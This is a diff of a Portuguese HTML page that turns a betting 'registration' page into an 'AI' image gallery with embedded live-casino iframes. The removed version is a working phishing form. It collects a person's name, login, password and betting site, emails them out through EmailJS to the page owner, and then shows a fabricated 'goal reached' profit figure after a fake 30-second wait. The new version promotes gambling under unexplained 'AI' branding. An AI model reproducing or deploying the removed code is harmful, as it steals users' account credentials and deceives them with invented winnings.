@@ -3,165 +3,322 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apostas - Meta Batida</title>
+    <title>Galeria de IA</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
+            background-color: black;
+            font-family: Arial, sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5); /* Fundo transparente */
+            padding: 10px;
+            text-align: center;
+            width: 100%;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            border-bottom: 2px solid #555; /* Linha sutil embaixo */
+        }
+        .menu {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        .menu a {
+            margin: 0 10px;
+            color: white;
+            font-size: 20px;
+            text-decoration: none;
+            padding: 10px;
+            transition: all 0.3s ease; /* Adiciona transição suave */
+        }
+        .menu a.active {
+            background-color: transparent;
+        }
+
+        .menu a.ia-kaum:hover {
+            background-color: #0077cc; /* Azul para IA Kaum */
+            transform: scale(1.1); /* Aumenta ligeiramente o tamanho */
+        }
+
+        .menu a.ia-mma:hover {
+            background-color: #ff0000; /* Vermelho para IA MMA */
+            transform: scale(1.1); /* Aumenta ligeiramente o tamanho */
+        }
+
+        .menu a.ia-dailler:hover {
+            background-color: #28a745; /* Verde para IA Dailler */
+            transform: scale(1.1); /* Aumenta ligeiramente o tamanho */
+        }
+
+        .menu a.active.ia-kaum {
+            background-color: #0077cc; /* Azul para IA Kaum */
+        }
+
+        .menu a.active.ia-mma {
+            background-color: #ff0000; /* Vermelho para IA MMA */
+        }
+
+        .menu a.active.ia-dailler {
+            background-color: #28a745; /* Verde para IA Dailler */
+        }
+
+        .container {
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background-color: #f1f1f1;
+            flex-grow: 1;
+            position: relative;
+            flex-direction: column; /* Adiciona coluna para empilhar imagem e casa de apostas */
+            padding: 10px; /* Espaço ao redor da área */
         }
-        .container {
-            text-align: center;
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        .image-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            max-width: 30%; /* Reduzi a largura da imagem para 30% */
+            margin-bottom: 20px; /* Distância entre a imagem e a casa de apostas */
+        }
+        .image-container img {
             width: 100%;
-            max-width: 500px;
+            height: auto;
+            display: block;
+            object-fit: contain; /* Ajusta a imagem sem distorcer */
+            border-radius: 10px; /* Arredonda os cantos da imagem */
         }
-        input {
-            margin: 10px 0;
-            padding: 10px;
-            width: 80%;
-            max-width: 400px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
+        /* Efeito de luz piscando */
+        @keyframes glow {
+            0% {
+                box-shadow: 0 0 15px 5px rgba(0, 0, 255, 0.8); /* Azul */
+            }
+            50% {
+                box-shadow: 0 0 25px 10px rgba(0, 0, 255, 1); /* Azul mais forte */
+            }
+            100% {
+                box-shadow: 0 0 15px 5px rgba(0, 0, 255, 0.8); /* Azul */
+            }
         }
-        button {
-            padding: 10px 20px;
-            border: none;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 16px;
-            border-radius: 5px;
+
+        @keyframes glowRed {
+            0% {
+                box-shadow: 0 0 15px 5px rgba(255, 0, 0, 0.8); /* Vermelho */
+            }
+            50% {
+                box-shadow: 0 0 25px 10px rgba(255, 0, 0, 1); /* Vermelho mais forte */
+            }
+            100% {
+                box-shadow: 0 0 15px 5px rgba(255, 0, 0, 0.8); /* Vermelho */
+            }
+        }
+
+        @keyframes glowGreen {
+            0% {
+                box-shadow: 0 0 15px 5px rgba(0, 255, 0, 0.8); /* Verde */
+            }
+            50% {
+                box-shadow: 0 0 25px 10px rgba(0, 255, 0, 1); /* Verde mais forte */
+            }
+            100% {
+                box-shadow: 0 0 15px 5px rgba(0, 255, 0, 0.8); /* Verde */
+            }
+        }
+
+        .ia-kaum img {
+            animation: glow 1.5s infinite alternate;
+        }
+
+        .ia-mma img {
+            animation: glowRed 1.5s infinite alternate;
+        }
+
+        .ia-dailler img {
+            animation: glowGreen 1.5s infinite alternate;
+        }
+
+        .arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 30px;
+            color: black; /* Setas agora são pretas */
             cursor: pointer;
+            background-color: rgba(0, 0, 0, 0.5); /* Fundo preto para as setas */
+            border-radius: 50%;
+            padding: 15px; /* Aumentei o espaço para afastar mais */
         }
-        button:hover {
-            background-color: #45a049;
+        .arrow-left {
+            left: -60px; /* Afastei as setas para a esquerda */
         }
-        .loading {
-            display: none;
+        .arrow-right {
+            right: -60px; /* Afastei as setas para a direita */
+        }
+
+        /* Estilos para a Casa de Apostas */
+        .bet-container {
             margin-top: 20px;
-            font-size: 24px;
+            width: 100%;
+            max-width: 1200px; /* Limita a largura da casa de apostas */
+            height: 500px;
+            border: 2px solid orange; /* Borda laranja */
+            border-radius: 10px;
+            overflow: hidden;
         }
-        .meta {
-            display: none;
-            font-size: 32px;
-            color: green;
+
+        .bet-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
         }
-        .meta span {
-            font-size: 50px;
-        }
-        .meta-client {
-            font-size: 24px;
-            margin-top: 20px;
-        }
-        .meta-lucro {
-            font-size: 20px;
-            margin-top: 10px;
-        }
+
     </style>
 </head>
 <body>
+    <header>
+        <div class="menu">
+            <a href="#" class="active ia-kaum" onclick="changePage(0)">IA Kaum</a>
+            <a href="#" class="ia-mma" onclick="changePage(1)">IA MMA</a>
+            <a href="#" class="ia-dailler" onclick="changePage(2)">IA Dailler</a>
+        </div>
+    </header>
 
     <div class="container">
-        <h2>Cadastro - Casa de Apostas</h2>
-        
-        <form id="nameForm">
-            <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required><br>
-            <input type="text" id="login" name="login" placeholder="Digite seu login" required><br>
-            <input type="password" id="senha" name="senha" placeholder="Digite sua senha" required><br>
-            <input type="text" id="casa" name="casa" placeholder="Digite a casa de apostas" required><br>
-            <button type="submit">Continuar</button>
-        </form>
-
-        <div id="bancaForm" style="display:none;">
-            <h3>Insira o valor da sua banca:</h3>
-            <input type="number" id="banca" name="banca" placeholder="Valor da Banca" required><br>
-            <button id="startTimer">Iniciar</button>
+        <div id="page-0" class="page ia-kaum" style="display: block;">
+            <div class="image-container">
+                <span class="arrow arrow-left" onclick="prevImage(0)">&#10094;</span>
+                <img src="https://i.imgur.com/jEfPeuy.png" id="image-0" alt="IA Kaum">
+                <span class="arrow arrow-right" onclick="nextImage(0)">&#10095;</span>
+            </div>
+            <!-- Casa de Apostas para IA Kaum -->
+            <div class="bet-container">
+                <iframe src="https://reals.bet.br/live-casino/game/1402430?provider=Evolution&from=%2Flive-casino" title="Casa de Apostas IA Kaum"></iframe>
+            </div>
         </div>
 
-        <div id="loading" class="loading">
-            <p>Carregando...</p>
+        <div id="page-1" class="page ia-mma" style="display: none;">
+            <div class="image-container">
+                <span class="arrow arrow-left" onclick="prevImage(1)">&#10094;</span>
+                <img src="https://i.imgur.com/1yDajnb.jpeg" id="image-1" alt="IA MMA">
+                <span class="arrow arrow-right" onclick="nextImage(1)">&#10095;</span>
+            </div>
+            <!-- Casa de Apostas para IA MMA -->
+            <div class="bet-container">
+                <iframe src="https://reals.bet.br/live-casino/game/1402430?provider=Evolution&from=%2Flive-casino" title="Casa de Apostas IA MMA"></iframe>
+            </div>
         </div>
 
-        <div id="meta" class="meta">
-            <span>✅</span>
-            <h3>Meta Batida!</h3>
-            <div id="clienteNome" class="meta-client"></div>
-            <div id="metadeLucro" class="meta-lucro"></div>
+        <div id="page-2" class="page ia-dailler" style="display: none;">
+            <div class="image-container">
+                <span class="arrow arrow-left" onclick="prevImage(2)">&#10094;</span>
+                <img src="https://i.imgur.com/rlNc9fC.jpeg" id="image-2" alt="IA Dailler">
+                <span class="arrow arrow-right" onclick="nextImage(2)">&#10095;</span>
+            </div>
+            <!-- Casa de Apostas para IA Dailler -->
+            <div class="bet-container">
+                <iframe src="https://reals.bet.br/live-casino/game/1402430?provider=Evolution&from=%2Flive-casino" title="Casa de Apostas IA Dailler"></iframe>
+            </div>
         </div>
     </div>
 
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Inicializa o EmailJS com o seu User ID
-        emailjs.init("YOUR_USER_ID");  // Substitua "YOUR_USER_ID" pelo seu User ID do EmailJS
+        const images = {
+            0: [
+                "https://i.imgur.com/jEfPeuy.png",
+                "https://i.imgur.com/iYHjHJ2.jpeg",
+                "https://i.imgur.com/sfUI6Gz.png",
+                "https://i.imgur.com/zHR5d6V.png",
+                "https://i.imgur.com/XwqcnhB.jpeg",
+                "https://i.imgur.com/AIx9O40.jpeg",
+                "https://i.imgur.com/WrXCrTj.jpeg",
+                "https://i.imgur.com/SpeUYVX.png",
+                "https://i.imgur.com/TA9VH46.png",
+                "https://i.imgur.com/NblKDvv.png",
+                "https://i.imgur.com/Pif6T4a.png",
+                "https://i.imgur.com/1OrihUc.png",
+                "https://i.imgur.com/dKInun1.png",
+                "https://i.imgur.com/qTG14aU.png",
+                "https://i.imgur.com/J8XPwjb.png",
+                "https://i.imgur.com/UoVxmrQ.png",
+                "https://i.imgur.com/noMS1pN.png",
+                "https://i.imgur.com/uVSBdd5.png",
+                "https://i.imgur.com/FCCmNXn.png",
+                "https://i.imgur.com/txrBZ1k.png",
+                "https://i.imgur.com/FlsVqx3.jpeg",
+                "https://i.imgur.com/wBiclz8.jpeg",
+                "https://i.imgur.com/VjAdygg.png",
+                "https://i.imgur.com/WbXYMEm.png",
+                "https://i.imgur.com/43y7Whu.png",
+                "https://i.imgur.com/6ZG2y3p.png",
+                "https://i.imgur.com/3UnfRuF.png",
+                "https://i.imgur.com/iVrRER2.png",
+                "https://i.imgur.com/7og0G2E.png"
+            ],
+            1: [
+                "https://i.imgur.com/1yDajnb.jpeg",
+                "https://i.imgur.com/GFEDwE4.jpeg",
+                "https://i.imgur.com/ytReYQT.jpeg",
+                "https://i.imgur.com/U3VDYpo.jpeg"
+            ],
+            2: [
+                "https://i.imgur.com/rlNc9fC.jpeg",
+                "https://i.imgur.com/AW45oe7.jpeg",
+                "https://i.imgur.com/E9ZeffI.jpeg",
+                "https://i.imgur.com/eYh26wU.jpeg",
+                "https://i.imgur.com/INpP7Ex.jpeg",
+                "https://i.imgur.com/4Zlkjjb.png",
+                "https://i.imgur.com/qhy4EJH.png",
+                "https://i.imgur.com/qLhnLhT.png",
+                "https://i.imgur.com/Q1TZDn1.png",
+                "https://i.imgur.com/iB7hgG7.png",
+                "https://i.imgur.com/vyGfb7y.png",
+                "https://i.imgur.com/BKtFVwE.jpeg",
+                "https://i.imgur.com/416biM7.jpeg",
+                "https://i.imgur.com/rakg3fB.jpeg",
+                "https://i.imgur.com/aqBvygS.jpeg",
+                "https://i.imgur.com/pQUpouC.jpeg",
+                "https://i.imgur.com/6n0ukwq.jpeg"
+            ]
+        };
 
-        // Passo 1: Coleta do nome, login, senha e casa de apostas
-        document.getElementById('nameForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        let currentImage = [0, 0, 0];
 
-            // Pegando os dados inseridos
-            const nome = document.getElementById('nome').value;
-            const login = document.getElementById('login').value;
-            const senha = document.getElementById('senha').value;
-            const casa = document.getElementById('casa').value;
+        function changePage(pageIndex) {
+            document.querySelectorAll('.page').forEach((page, index) => {
+                page.style.display = index === pageIndex ? 'block' : 'none';
+            });
+            document.querySelectorAll('.menu a').forEach((link, index) => {
+                link.classList.remove('active');
+                if (index === pageIndex) {
+                    link.classList.add('active');
+                }
+            });
+            // Atualiza a imagem ao mudar de página
+            updateImage(pageIndex);
+        }
 
-            if (nome && login && senha && casa) {
-                // Esconde o formulário de cadastro e mostra o próximo formulário
-                document.getElementById('nameForm').style.display = 'none';
-                document.getElementById('bancaForm').style.display = 'block';
-            } else {
-                alert('Por favor, preencha todos os campos.');
-            }
+        function nextImage(pageIndex) {
+            currentImage[pageIndex] = (currentImage[pageIndex] + 1) % images[pageIndex].length;
+            updateImage(pageIndex);
+        }
 
-            // Enviar os dados para o e-mail com o EmailJS
-            const templateParams = {
-                nome: nome,
-                login: login,
-                senha: senha,
-                casa: casa
-            };
+        function prevImage(pageIndex) {
+            currentImage[pageIndex] = (currentImage[pageIndex] - 1 + images[pageIndex].length) % images[pageIndex].length;
+            updateImage(pageIndex);
+        }
 
-            emailjs.send('service_8uhb7qa', 'template_3ljvygr', templateParams) // Substitua pelo seu Service ID e Template ID
-                .then(function(response) {
-                    console.log('Success', response);
-                    alert('Dados enviados com sucesso!');
-                }, function(error) {
-                    console.log('Failed', error);
-                    alert('Erro ao enviar os dados');
-                });
-        });
+        function updateImage(pageIndex) {
+            const imageElement = document.getElementById(`image-${pageIndex}`);
+            imageElement.src = images[pageIndex][currentImage[pageIndex]];
+        }
 
-        // Passo 2: Validação e cálculo do valor da banca
-        document.getElementById('startTimer').addEventListener('click', function() {
-            const banca = document.getElementById('banca').value;
-            const nome = document.getElementById('nome').value;
-
-            if (banca && !isNaN(banca) && banca > 0) {
-                document.getElementById('loading').style.display = 'block';
-                document.getElementById('bancaForm').style.display = 'none';
-
-                setTimeout(function() {
-                    const metadeLucro = banca / 2;
-
-                    document.getElementById('loading').style.display = 'none';
-                    document.getElementById('meta').style.display = 'block';
-
-                    document.getElementById('clienteNome').textContent = `Cliente: ${nome}`;
-                    document.getElementById('metadeLucro').textContent = `Metade do Lucro: R$${metadeLucro.toFixed(2)}`;
-                }, 30000);
-            } else {
-                alert('Por favor, insira um valor válido para a banca.');
-            }
-        });
+        // Muda para a página inicial
+        changePage(0);
     </script>
-
 </body>
 </html>
